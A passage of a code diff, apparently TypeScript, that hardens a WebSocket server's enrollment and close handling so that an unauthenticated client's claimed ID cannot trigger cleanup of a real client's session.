+    if (socketRole === "client" && ws.data.enrollmentState !== "authenticated") {
+      rejectEnrollment(ws);
+      try { ws.close(1011, "enrollment_error"); } catch {}
+    }
   }
 }
 
@@ -996,7 +1409,8 @@ export function handleWebSocketClose(
   const role = ws.data.role as string;
   const sessionId = ws.data.sessionId;
 
-  clearEnrollmentTimeout(clientId);
+  clearEnrollmentTimeout(ws);
+  releaseEnrollmentAdmission(ws);
 
   if (role === "console_viewer") {
     if (sessionId) {
@@ -1122,6 +1536,14 @@ export function handleWebSocketClose(
     if (sessionId) {
       sessionManager.deleteChatSession(sessionId);
     }
+    return;
+  }
+
+  // Until hello authentication completes, clientId is only an untrusted URL
+  // claim. It must not drive cleanup for a real client with that ID.
+  if (role === "client" && ws.data.enrollmentState !== "authenticated") {
+    ws.data.enrollmentState = "rejected";
+    ws.data.enrollmentNonce = undefined;
     return;
   }
 
